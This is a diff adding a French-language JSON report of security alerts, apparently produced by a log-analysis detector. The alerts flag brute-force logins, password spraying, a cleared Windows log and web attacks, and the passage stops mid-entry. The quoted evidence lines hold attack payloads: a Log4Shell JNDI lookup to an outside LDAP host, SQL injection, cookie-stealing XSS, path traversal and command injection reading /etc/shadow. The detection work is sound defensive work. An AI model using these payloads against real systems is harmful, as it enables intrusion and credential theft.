@@ -1,0 +1,555 @@
+[
+  {
+    "severity": "critique",
+    "category": "Brute-force réussi",
+    "title": "Connexion RÉUSSIE de « Administrateur » depuis 80.94.95.12 après 45 échecs",
+    "source": "windows",
+    "ip": "80.94.95.12",
+    "user": "Administrateur",
+    "count": 46,
+    "first_seen": "2026-11-11 03:01:25",
+    "last_seen": "2026-11-11 03:01:35",
+    "evidence": [
+      "EventID=4625 SubjectUserName=SRV-FILES01$ TargetUserName=Administrateur TargetDomainName=CORP LogonType=10 WorkstationName=PC-ADMINI IpAddress=80.94.95.12 Status=0xc000006d SubStatus=0xc000006a",
+      "EventID=4625 SubjectUserName=SRV-FILES01$ TargetUserName=Administrateur TargetDomainName=CORP LogonType=10 WorkstationName=PC-ADMINI IpAddress=80.94.95.12 Status=0xc000006d SubStatus=0xc000006a",
+      "EventID=4625 SubjectUserName=SRV-FILES01$ TargetUserName=Administrateur TargetDomainName=CORP LogonType=10 WorkstationName=PC-ADMINI IpAddress=80.94.95.12 Status=0xc000006d SubStatus=0xc000006a",
+      "EventID=4625 SubjectUserName=SRV-FILES01$ TargetUserName=Administrateur TargetDomainName=CORP LogonType=10 WorkstationName=PC-ADMINI IpAddress=80.94.95.12 Status=0xc000006d SubStatus=0xc000006a",
+      "EventID=4625 SubjectUserName=SRV-FILES01$ TargetUserName=Administrateur TargetDomainName=CORP LogonType=10 WorkstationName=PC-ADMINI IpAddress=80.94.95.12 Status=0xc000006d SubStatus=0xc000006a",
+      "EventID=4624 SubjectUserName=SRV-FILES01$ TargetUserName=Administrateur TargetDomainName=CORP LogonType=10 WorkstationName=PC-ADMINI IpAddress=80.94.95.12"
+    ]
+  },
+  {
+    "severity": "critique",
+    "category": "Activité Windows",
+    "title": "Journal de sécurité effacé par Administrateur sur SRV-FILES01.corp.local",
+    "source": "windows",
+    "ip": null,
+    "user": "Administrateur",
+    "count": 1,
+    "first_seen": "2026-11-11 03:35:00",
+    "last_seen": "2026-11-11 03:35:00",
+    "evidence": [
+      "EventID=1102 SubjectUserName=Administrateur"
+    ]
+  },
+  {
+    "severity": "critique",
+    "category": "Fichier sensible exposé",
+    "title": "/.env renvoyé avec succès (200) à 91.240.118.50",
+    "source": "apache",
+    "ip": "91.240.118.50",
+    "user": null,
+    "count": 1,
+    "first_seen": "2026-11-11 05:30:00",
+    "last_seen": "2026-11-11 05:30:00",
+    "evidence": [
+      "91.240.118.50 - - [11/Nov/2026:05:30:00 +0100] \"GET /.env HTTP/1.1\" 200 512 \"-\" \"curl/8.4.0\""
+    ]
+  },
+  {
+    "severity": "critique",
+    "category": "Fichier sensible exposé",
+    "title": "/.git/config renvoyé avec succès (200) à 91.240.118.50",
+    "source": "apache",
+    "ip": "91.240.118.50",
+    "user": null,
+    "count": 1,
+    "first_seen": "2026-11-11 05:30:01",
+    "last_seen": "2026-11-11 05:30:01",
+    "evidence": [
+      "91.240.118.50 - - [11/Nov/2026:05:30:01 +0100] \"GET /.git/config HTTP/1.1\" 200 512 \"-\" \"curl/8.4.0\""
+    ]
+  },
+  {
+    "severity": "critique",
+    "category": "Fichier sensible exposé",
+    "title": "/download?file=../../../../etc/passwd renvoyé avec succès (200) à 198.51.100.77",
+    "source": "apache",
+    "ip": "198.51.100.77",
+    "user": null,
+    "count": 1,
+    "first_seen": "2026-11-11 11:00:46",
+    "last_seen": "2026-11-11 11:00:46",
+    "evidence": [
+      "198.51.100.77 - - [11/Nov/2026:11:00:46 +0100] \"GET /download?file=../../../../etc/passwd HTTP/1.1\" 200 16934 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\""
+    ]
+  },
+  {
+    "severity": "critique",
+    "category": "Brute-force réussi",
+    "title": "Connexion RÉUSSIE de « deploy » depuis 185.220.101.7 après 35 échecs",
+    "source": "auth",
+    "ip": "185.220.101.7",
+    "user": "deploy",
+    "count": 36,
+    "first_seen": "2026-11-11 13:31:53",
+    "last_seen": "2026-11-11 13:32:11",
+    "evidence": [
+      "Nov 11 13:31:53 srv-web01 sshd[7120]: Failed password for deploy from 185.220.101.7 port 51966 ssh2",
+      "Nov 11 13:31:58 srv-web01 sshd[45092]: Failed password for deploy from 185.220.101.7 port 45392 ssh2",
+      "Nov 11 13:32:01 srv-web01 sshd[10656]: Failed password for deploy from 185.220.101.7 port 43050 ssh2",
+      "Nov 11 13:32:04 srv-web01 sshd[32138]: Failed password for deploy from 185.220.101.7 port 46046 ssh2",
+      "Nov 11 13:32:08 srv-web01 sshd[30846]: Failed password for deploy from 185.220.101.7 port 34772 ssh2",
+      "Nov 11 13:32:11 srv-web01 sshd[48077]: Accepted password for deploy from 185.220.101.7 port 42742 ssh2"
+    ]
+  },
+  {
+    "severity": "haute",
+    "category": "Scan web",
+    "title": "Énumération : 106 réponses 404 pour 192.0.2.10 (106 chemins distincts, pic 106 en 5 min)",
+    "source": "apache",
+    "ip": "192.0.2.10",
+    "user": null,
+    "count": 106,
+    "first_seen": "2026-11-11 01:00:00",
+    "last_seen": "2026-11-11 01:01:11",
+    "evidence": [
+      "192.0.2.10 - - [11/Nov/2026:01:00:00 +0100] \"GET /phpmyadmin/ HTTP/1.1\" 404 514 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000001)\"",
+      "192.0.2.10 - - [11/Nov/2026:01:00:01 +0100] \"GET /.git/config HTTP/1.1\" 404 517 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000002)\"",
+      "192.0.2.10 - - [11/Nov/2026:01:00:02 +0100] \"GET /.env HTTP/1.1\" 404 196 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000003)\"",
+      "192.0.2.10 - - [11/Nov/2026:01:00:02 +0100] \"GET /backup.sql HTTP/1.1\" 404 380 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000004)\"",
+      "192.0.2.10 - - [11/Nov/2026:01:00:03 +0100] \"GET /config.php.bak HTTP/1.1\" 404 193 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000005)\"",
+      "192.0.2.10 - - [11/Nov/2026:01:00:03 +0100] \"GET /server-status HTTP/1.1\" 404 346 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000006)\"",
+      "…"
+    ]
+  },
+  {
+    "severity": "haute",
+    "category": "Scan web",
+    "title": "Outil de scan détecté (nikto) depuis 192.0.2.10 — 120 requêtes",
+    "source": "apache",
+    "ip": "192.0.2.10",
+    "user": null,
+    "count": 120,
+    "first_seen": "2026-11-11 01:00:00",
+    "last_seen": "2026-11-11 01:01:11",
+    "evidence": [
+      "192.0.2.10 - - [11/Nov/2026:01:00:00 +0100] \"GET /admin/ HTTP/1.1\" 403 315 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000000)\"",
+      "192.0.2.10 - - [11/Nov/2026:01:00:00 +0100] \"GET /phpmyadmin/ HTTP/1.1\" 404 514 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000001)\"",
+      "192.0.2.10 - - [11/Nov/2026:01:00:01 +0100] \"GET /.git/config HTTP/1.1\" 404 517 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000002)\"",
+      "192.0.2.10 - - [11/Nov/2026:01:00:02 +0100] \"GET /.env HTTP/1.1\" 404 196 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000003)\"",
+      "192.0.2.10 - - [11/Nov/2026:01:00:02 +0100] \"GET /backup.sql HTTP/1.1\" 404 380 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000004)\"",
+      "192.0.2.10 - - [11/Nov/2026:01:00:03 +0100] \"GET /config.php.bak HTTP/1.1\" 404 193 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000005)\"",
+      "…"
+    ]
+  },
+  {
+    "severity": "haute",
+    "category": "Brute-force",
+    "title": "80 échecs de connexion depuis 203.0.113.45 (pic : 80 en 10 min) — comptes visés : root (80)",
+    "source": "auth",
+    "ip": "203.0.113.45",
+    "user": "root",
+    "count": 80,
+    "first_seen": "2026-11-11 02:10:00",
+    "last_seen": "2026-11-11 02:13:24",
+    "evidence": [
+      "Nov 11 02:10:00 srv-web01 sshd[11016]: Failed password for root from 203.0.113.45 port 37185 ssh2",
+      "Nov 11 02:10:02 srv-web01 sshd[40086]: Failed password for root from 203.0.113.45 port 57666 ssh2",
+      "Nov 11 02:10:04 srv-web01 sshd[40052]: Failed password for root from 203.0.113.45 port 55009 ssh2",
+      "Nov 11 02:10:08 srv-web01 sshd[17476]: Failed password for root from 203.0.113.45 port 64676 ssh2",
+      "Nov 11 02:10:11 srv-web01 sshd[45583]: Failed password for root from 203.0.113.45 port 30752 ssh2",
+      "Nov 11 02:10:15 srv-web01 sshd[51370]: Failed password for root from 203.0.113.45 port 47486 ssh2",
+      "…"
+    ]
+  },
+  {
+    "severity": "haute",
+    "category": "Brute-force",
+    "title": "45 échecs de connexion depuis 80.94.95.12 (pic : 45 en 10 min) — comptes visés : Administrateur (45)",
+    "source": "windows",
+    "ip": "80.94.95.12",
+    "user": "Administrateur",
+    "count": 45,
+    "first_seen": "2026-11-11 03:00:00",
+    "last_seen": "2026-11-11 03:01:31",
+    "evidence": [
+      "EventID=4625 SubjectUserName=SRV-FILES01$ TargetUserName=Administrateur TargetDomainName=CORP LogonType=10 WorkstationName=PC-ADMINI IpAddress=80.94.95.12 Status=0xc000006d SubStatus=0xc000006a",
+      "EventID=4625 SubjectUserName=SRV-FILES01$ TargetUserName=Administrateur TargetDomainName=CORP LogonType=10 WorkstationName=PC-ADMINI IpAddress=80.94.95.12 Status=0xc000006d SubStatus=0xc000006a",
+      "EventID=4625 SubjectUserName=SRV-FILES01$ TargetUserName=Administrateur TargetDomainName=CORP LogonType=10 WorkstationName=PC-ADMINI IpAddress=80.94.95.12 Status=0xc000006d SubStatus=0xc000006a",
+      "EventID=4625 SubjectUserName=SRV-FILES01$ TargetUserName=Administrateur TargetDomainName=CORP LogonType=10 WorkstationName=PC-ADMINI IpAddress=80.94.95.12 Status=0xc000006d SubStatus=0xc000006a",
+      "EventID=4625 SubjectUserName=SRV-FILES01$ TargetUserName=Administrateur TargetDomainName=CORP LogonType=10 WorkstationName=PC-ADMINI IpAddress=80.94.95.12 Status=0xc000006d SubStatus=0xc000006a",
+      "EventID=4625 SubjectUserName=SRV-FILES01$ TargetUserName=Administrateur TargetDomainName=CORP LogonType=10 WorkstationName=PC-ADMINI IpAddress=80.94.95.12 Status=0xc000006d SubStatus=0xc000006a",
+      "…"
+    ]
+  },
+  {
+    "severity": "haute",
+    "category": "Connexion anormale",
+    "title": "Session RDP de « Administrateur » depuis l'IP publique 80.94.95.12",
+    "source": "windows",
+    "ip": "80.94.95.12",
+    "user": "Administrateur",
+    "count": 1,
+    "first_seen": "2026-11-11 03:01:35",
+    "last_seen": "2026-11-11 03:01:35",
+    "evidence": [
+      "EventID=4624 SubjectUserName=SRV-FILES01$ TargetUserName=Administrateur TargetDomainName=CORP LogonType=10 WorkstationName=PC-ADMINI IpAddress=80.94.95.12"
+    ]
+  },
+  {
+    "severity": "haute",
+    "category": "Activité Windows",
+    "title": "svc_maint ajouté au groupe Administrateurs par Administrateur",
+    "source": "windows",
+    "ip": null,
+    "user": "svc_maint",
+    "count": 1,
+    "first_seen": "2026-11-11 03:21:00",
+    "last_seen": "2026-11-11 03:21:00",
+    "evidence": [
+      "EventID=4732 MemberName=CN=svc_maint,CN=Users,DC=corp,DC=local TargetUserName=Administrateurs TargetDomainName=BUILTIN SubjectUserName=Administrateur"
+    ]
+  },
+  {
+    "severity": "haute",
+    "category": "Brute-force distribué",
+    "title": "Compte « admin » attaqué depuis 9 IP différentes (33 échecs)",
+    "source": "auth",
+    "ip": null,
+    "user": "admin",
+    "count": 33,
+    "first_seen": "2026-11-11 04:00:01",
+    "last_seen": "2026-11-11 20:32:53",
+    "evidence": [
+      "Nov 11 04:00:01 srv-web01 sshd[29956]: Failed password for invalid user admin from 198.51.100.23 port 40589 ssh2",
+      "Nov 11 06:31:00 srv-web01 sshd[16989]: Failed password for invalid user admin from 103.40.179.99 port 56191 ssh2",
+      "Nov 11 06:31:43 srv-web01 sshd[59501]: Failed password for invalid user admin from 103.40.179.99 port 30363 ssh2",
+      "Nov 11 06:33:20 srv-web01 sshd[52014]: Failed password for invalid user admin from 103.40.179.99 port 36985 ssh2",
+      "Nov 11 06:34:29 srv-web01 sshd[53698]: Failed password for invalid user admin from 103.40.179.99 port 41526 ssh2",
+      "Nov 11 08:03:00 srv-web01 sshd[56596]: Failed password for invalid user admin from 103.41.133.119 port 46331 ssh2",
+      "…"
+    ]
+  },
+  {
+    "severity": "haute",
+    "category": "Password spraying",
+    "title": "198.51.100.23 a essayé 11 comptes différents : admin, test, oracle, postgres, ubuntu, guest, ftp, user…",
+    "source": "auth",
+    "ip": "198.51.100.23",
+    "user": null,
+    "count": 11,
+    "first_seen": "2026-11-11 04:00:01",
+    "last_seen": "2026-11-11 04:01:54",
+    "evidence": [
+      "Nov 11 04:00:01 srv-web01 sshd[29956]: Failed password for invalid user admin from 198.51.100.23 port 40589 ssh2",
+      "Nov 11 04:00:14 srv-web01 sshd[1633]: Failed password for invalid user test from 198.51.100.23 port 58028 ssh2",
+      "Nov 11 04:00:20 srv-web01 sshd[3361]: Failed password for invalid user oracle from 198.51.100.23 port 39768 ssh2",
+      "Nov 11 04:00:38 srv-web01 sshd[9352]: Failed password for invalid user postgres from 198.51.100.23 port 39705 ssh2",
+      "Nov 11 04:00:44 srv-web01 sshd[53174]: Failed password for invalid user ubuntu from 198.51.100.23 port 53897 ssh2",
+      "Nov 11 04:01:03 srv-web01 sshd[24449]: Failed password for invalid user guest from 198.51.100.23 port 32614 ssh2",
+      "…"
+    ]
+  },
+  {
+    "severity": "haute",
+    "category": "Attaque web",
+    "title": "Log4Shell (JNDI) : 1 requête(s) depuis 45.95.147.236 dont 1 avec réponse 2xx/3xx",
+    "source": "apache",
+    "ip": "45.95.147.236",
+    "user": null,
+    "count": 1,
+    "first_seen": "2026-11-11 07:42:00",
+    "last_seen": "2026-11-11 07:42:00",
+    "evidence": [
+      "45.95.147.236 - - [11/Nov/2026:07:42:00 +0100] \"GET / HTTP/1.1\" 200 12308 \"-\" \"${jndi:ldap://45.95.147.236:1389/Exploit}\""
+    ]
+  },
+  {
+    "severity": "haute",
+    "category": "Scan web",
+    "title": "Énumération : 200 réponses 404 pour 203.0.113.99 (200 chemins distincts, pic 200 en 5 min)",
+    "source": "apache",
+    "ip": "203.0.113.99",
+    "user": null,
+    "count": 200,
+    "first_seen": "2026-11-11 09:15:00",
+    "last_seen": "2026-11-11 09:16:08",
+    "evidence": [
+      "203.0.113.99 - - [11/Nov/2026:09:15:00 +0100] \"GET /admin/ HTTP/1.1\" 404 162 \"-\" \"Mozilla/5.0 (X11; Linux x86_64)\"",
+      "203.0.113.99 - - [11/Nov/2026:09:15:00 +0100] \"GET /backup/ HTTP/1.1\" 404 406 \"-\" \"Mozilla/5.0 (X11; Linux x86_64)\"",
+      "203.0.113.99 - - [11/Nov/2026:09:15:00 +0100] \"GET /old/ HTTP/1.1\" 404 324 \"-\" \"Mozilla/5.0 (X11; Linux x86_64)\"",
+      "203.0.113.99 - - [11/Nov/2026:09:15:01 +0100] \"GET /dev/ HTTP/1.1\" 404 525 \"-\" \"Mozilla/5.0 (X11; Linux x86_64)\"",
+      "203.0.113.99 - - [11/Nov/2026:09:15:01 +0100] \"GET /test/ HTTP/1.1\" 404 308 \"-\" \"Mozilla/5.0 (X11; Linux x86_64)\"",
+      "203.0.113.99 - - [11/Nov/2026:09:15:02 +0100] \"GET /api/ HTTP/1.1\" 404 223 \"-\" \"Mozilla/5.0 (X11; Linux x86_64)\"",
+      "…"
+    ]
+  },
+  {
+    "severity": "haute",
+    "category": "Attaque web",
+    "title": "Injection SQL : 9 requête(s) depuis 198.51.100.77 dont 2 avec réponse 2xx/3xx",
+    "source": "apache",
+    "ip": "198.51.100.77",
+    "user": null,
+    "count": 9,
+    "first_seen": "2026-11-11 11:00:00",
+    "last_seen": "2026-11-11 11:02:28",
+    "evidence": [
+      "198.51.100.77 - - [11/Nov/2026:11:00:00 +0100] \"GET /products.php?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1\" 403 311 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+      "198.51.100.77 - - [11/Nov/2026:11:00:14 +0100] \"GET /products.php?id=1%27%20OR%20%271%27=%271 HTTP/1.1\" 403 171 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+      "198.51.100.77 - - [11/Nov/2026:11:00:18 +0100] \"GET /products.php?id=1%20AND%20SLEEP(5) HTTP/1.1\" 403 476 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+      "198.51.100.77 - - [11/Nov/2026:11:01:09 +0100] \"GET /products.php?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1\" 403 273 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+      "198.51.100.77 - - [11/Nov/2026:11:01:21 +0100] \"GET /products.php?id=1%27%20OR%20%271%27=%271 HTTP/1.1\" 403 544 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+      "198.51.100.77 - - [11/Nov/2026:11:01:26 +0100] \"GET /products.php?id=1%20AND%20SLEEP(5) HTTP/1.1\" 500 496 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+      "…"
+    ]
+  },
+  {
+    "severity": "haute",
+    "category": "Attaque web",
+    "title": "XSS : 6 requête(s) depuis 198.51.100.77 dont 2 avec réponse 2xx/3xx",
+    "source": "apache",
+    "ip": "198.51.100.77",
+    "user": null,
+    "count": 6,
+    "first_seen": "2026-11-11 11:00:25",
+    "last_seen": "2026-11-11 11:02:49",
+    "evidence": [
+      "198.51.100.77 - - [11/Nov/2026:11:00:25 +0100] \"GET /search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1\" 500 462 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+      "198.51.100.77 - - [11/Nov/2026:11:00:39 +0100] \"GET /search?q=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E HTTP/1.1\" 500 321 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+      "198.51.100.77 - - [11/Nov/2026:11:01:37 +0100] \"GET /search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1\" 200 20730 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+      "198.51.100.77 - - [11/Nov/2026:11:01:47 +0100] \"GET /search?q=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E HTTP/1.1\" 403 154 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+      "198.51.100.77 - - [11/Nov/2026:11:02:39 +0100] \"GET /search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1\" 200 39481 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+      "198.51.100.77 - - [11/Nov/2026:11:02:49 +0100] \"GET /search?q=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E HTTP/1.1\" 403 211 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\""
+    ]
+  },
+  {
+    "severity": "haute",
+    "category": "Attaque web",
+    "title": "Traversée de répertoires : 3 requête(s) depuis 198.51.100.77 dont 2 avec réponse 2xx/3xx",
+    "source": "apache",
+    "ip": "198.51.100.77",
+    "user": null,
+    "count": 3,
+    "first_seen": "2026-11-11 11:00:46",
+    "last_seen": "2026-11-11 11:02:53",
+    "evidence": [
+      "198.51.100.77 - - [11/Nov/2026:11:00:46 +0100] \"GET /download?file=../../../../etc/passwd HTTP/1.1\" 200 16934 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+      "198.51.100.77 - - [11/Nov/2026:11:02:00 +0100] \"GET /download?file=../../../../etc/passwd HTTP/1.1\" 200 27151 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+      "198.51.100.77 - - [11/Nov/2026:11:02:53 +0100] \"GET /download?file=../../../../etc/passwd HTTP/1.1\" 403 216 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\""
+    ]
+  },
+  {
+    "severity": "haute",
+    "category": "Attaque web",
+    "title": "Injection de commande : 3 requête(s) depuis 198.51.100.77 dont 1 avec réponse 2xx/3xx",
+    "source": "apache",
+    "ip": "198.51.100.77",
+    "user": null,
+    "count": 3,
+    "first_seen": "2026-11-11 11:00:57",
+    "last_seen": "2026-11-11 11:03:01",
+    "evidence": [
+      "198.51.100.77 - - [11/Nov/2026:11:00:57 +0100] \"GET /ping?host=127.0.0.1;cat%20/etc/shadow HTTP/1.1\" 500 386 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+      "198.51.100.77 - - [11/Nov/2026:11:02:04 +0100] \"GET /ping?host=127.0.0.1;cat%20/etc/shadow HTTP/1.1\" 200 29425 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+      "198.51.100.77 - - [11/Nov/2026:11:03:01 +0100] \"GET /ping?host=127.0.0.1;cat%20/etc/shadow HTTP/1.1\" 403 439 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\""
+    ]
+  },
+  {
+    "severity": "haute",
+    "category": "Brute-force",
+    "title": "35 échecs de connexion depuis 185.220.101.7 (pic : 35 en 10 min) — comptes visés : deploy (35)",
+    "source": "auth",
+    "ip": "185.220.101.7",
+    "user": "deploy",
+    "count": 35,
+    "first_seen": "2026-11-11 13:30:00",
+    "last_seen": "2026-11-11 13:32:08",
+    "evidence": [
+      "Nov 11 13:30:00 srv-web01 sshd[18485]: Failed password for deploy from 185.220.101.7 port 46263 ssh2",
+      "Nov 11 13:30:02 srv-web01 sshd[26070]: Failed password for deploy from 185.220.101.7 port 37084 ssh2",
+      "Nov 11 13:30:08 srv-web01 sshd[15577]: Failed password for deploy from 185.220.101.7 port 60847 ssh2",
+      "Nov 11 13:30:10 srv-web01 sshd[23915]: Failed password for deploy from 185.220.101.7 port 60166 ssh2",
+      "Nov 11 13:30:14 srv-web01 sshd[15609]: Failed password for deploy from 185.220.101.7 port 44915 ssh2",
+      "Nov 11 13:30:16 srv-web01 sshd[27113]: Failed password for deploy from 185.220.101.7 port 42656 ssh2",
+      "…"
+    ]
+  },
+  {
+    "severity": "haute",
+    "category": "Brute-force web",
+    "title": "50 tentatives de login web depuis 45.155.205.3 sur /wp-login.php (50)",
+    "source": "apache",
+    "ip": "45.155.205.3",
+    "user": null,
+    "count": 50,
+    "first_seen": "2026-11-11 15:00:00",
+    "last_seen": "2026-11-11 15:02:52",
+    "evidence": [
+      "45.155.205.3 - - [11/Nov/2026:15:00:00 +0100] \"POST /wp-login.php HTTP/1.1\" 200 7464 \"https://www.example.com/wp-login.php\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+      "45.155.205.3 - - [11/Nov/2026:15:00:04 +0100] \"POST /wp-login.php HTTP/1.1\" 200 16802 \"https://www.example.com/wp-login.php\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+      "45.155.205.3 - - [11/Nov/2026:15:00:06 +0100] \"POST /wp-login.php HTTP/1.1\" 200 5162 \"https://www.example.com/wp-login.php\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+      "45.155.205.3 - - [11/Nov/2026:15:00:10 +0100] \"POST /wp-login.php HTTP/1.1\" 200 18313 \"https://www.example.com/wp-login.php\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+      "45.155.205.3 - - [11/Nov/2026:15:00:15 +0100] \"POST /wp-login.php HTTP/1.1\" 200 21394 \"https://www.example.com/wp-login.php\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+      "45.155.205.3 - - [11/Nov/2026:15:00:17 +0100] \"POST /wp-login.php HTTP/1.1\" 200 5049 \"https://www.example.com/wp-login.php\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"",
+      "…"
+    ]
+  },
+  {
+    "severity": "haute",
+    "category": "Password spraying",
+    "title": "10.0.0.66 a essayé 10 comptes différents : jdupont, mmartin, sleroy, pdurand, lbernard, cpetit, nrobert, arichard…",
+    "source": "windows",
+    "ip": "10.0.0.66",
+    "user": null,
+    "count": 10,
+    "first_seen": "2026-11-11 16:10:00",
+    "last_seen": "2026-11-11 16:10:44",
+    "evidence": [
+      "EventID=4625 SubjectUserName=SRV-FILES01$ TargetUserName=jdupont TargetDomainName=CORP LogonType=3 WorkstationName=PC-JDUPON IpAddress=10.0.0.66 Status=0xc000006d SubStatus=0xc000006a",
+      "EventID=4625 SubjectUserName=SRV-FILES01$ TargetUserName=mmartin TargetDomainName=CORP LogonType=3 WorkstationName=PC-MMARTI IpAddress=10.0.0.66 Status=0xc000006d SubStatus=0xc000006a",
+      "EventID=4625 SubjectUserName=SRV-FILES01$ TargetUserName=sleroy TargetDomainName=CORP LogonType=3 WorkstationName=PC-SLEROY IpAddress=10.0.0.66 Status=0xc000006d SubStatus=0xc000006a",
+      "EventID=4625 SubjectUserName=SRV-FILES01$ TargetUserName=pdurand TargetDomainName=CORP LogonType=3 WorkstationName=PC-PDURAN IpAddress=10.0.0.66 Status=0xc000006d SubStatus=0xc000006a",
+      "EventID=4625 SubjectUserName=SRV-FILES01$ TargetUserName=lbernard TargetDomainName=CORP LogonType=3 WorkstationName=PC-LBERNA IpAddress=10.0.0.66 Status=0xc000006d SubStatus=0xc000006a",
+      "EventID=4625 SubjectUserName=SRV-FILES01$ TargetUserName=cpetit TargetDomainName=CORP LogonType=3 WorkstationName=PC-CPETIT IpAddress=10.0.0.66 Status=0xc000006d SubStatus=0xc000006a",
+      "…"
+    ]
+  },
+  {
+    "severity": "haute",
+    "category": "Connexion anormale",
+    "title": "Nouvelle IP pour « alice » : 45.83.12.9 (jamais vue sur 10 connexions)",
+    "source": "auth",
+    "ip": "45.83.12.9",
+    "user": "alice",
+    "count": 1,
+    "first_seen": "2026-11-11 22:47:12",
+    "last_seen": "2026-11-11 22:47:12",
+    "evidence": [
+      "Nov 11 22:47:12 srv-web01 sshd[17532]: Accepted password for alice from 45.83.12.9 port 57627 ssh2"
+    ]
+  },
+  {
+    "severity": "moyenne",
+    "category": "Scan web",
+    "title": "Recherche de fichiers sensibles depuis 192.0.2.10 (8 chemins, ex. /phpmyadmin/, /.git/config, /.env, /backup.sql)",
+    "source": "apache",
+    "ip": "192.0.2.10",
+    "user": null,
+    "count": 66,
+    "first_seen": "2026-11-11 01:00:00",
+    "last_seen": "2026-11-11 01:01:11",
+    "evidence": [
+      "192.0.2.10 - - [11/Nov/2026:01:00:00 +0100] \"GET /phpmyadmin/ HTTP/1.1\" 404 514 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000001)\"",
+      "192.0.2.10 - - [11/Nov/2026:01:00:01 +0100] \"GET /.git/config HTTP/1.1\" 404 517 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000002)\"",
+      "192.0.2.10 - - [11/Nov/2026:01:00:02 +0100] \"GET /.env HTTP/1.1\" 404 196 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000003)\"",
+      "192.0.2.10 - - [11/Nov/2026:01:00:02 +0100] \"GET /backup.sql HTTP/1.1\" 404 380 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000004)\"",
+      "192.0.2.10 - - [11/Nov/2026:01:00:03 +0100] \"GET /config.php.bak HTTP/1.1\" 404 193 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000005)\"",
+      "192.0.2.10 - - [11/Nov/2026:01:00:03 +0100] \"GET /server-status HTTP/1.1\" 404 346 \"-\" \"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000006)\"",
+      "…"
+    ]
+  },
+  {
+    "severity": "moyenne",
+    "category": "Connexion anormale",
+    "title": "Connexion hors horaires (7h-20h) de « Administrateur » depuis 80.94.95.12 : 11/11 03:01",
+    "source": "windows",
+    "ip": "80.94.95.12",
+    "user": "Administrateur",
+    "count": 1,
+    "first_seen": "2026-11-11 03:01:35",
+    "last_seen": "2026-11-11 03:01:35",
+    "evidence": [
+      "EventID=4624 SubjectUserName=SRV-FILES01$ TargetUserName=Administrateur TargetDomainName=CORP LogonType=10 WorkstationName=PC-ADMINI IpAddress=80.94.95.12"
+    ]
+  },
+  {
+    "severity": "moyenne",
+    "category": "Activité Windows",
+    "title": "Compte créé : svc_maint (créé par Administrateur)",
+    "source": "windows",
+    "ip": null,
+    "user": "svc_maint",
+    "count": 1,
+    "first_seen": "2026-11-11 03:20:00",
+    "last_seen": "2026-11-11 03:20:00",
+    "evidence": [
+      "EventID=4720 TargetUserName=svc_maint TargetDomainName=CORP SubjectUserName=Administrateur"
+    ]
+  },
+  {
+    "severity": "moyenne",
+    "category": "Scan web",
+    "title": "Recherche de fichiers sensibles depuis 91.240.118.50 (4 chemins, ex. /.env, /.git/config, /wp-config.php.bak, /phpmyadmin/)",
+    "source": "apache",
+    "ip": "91.240.118.50",
+    "user": null,
+    "count": 4,
+    "first_seen": "2026-11-11 05:30:00",
+    "last_seen": "2026-11-11 05:30:05",
+    "evidence": [
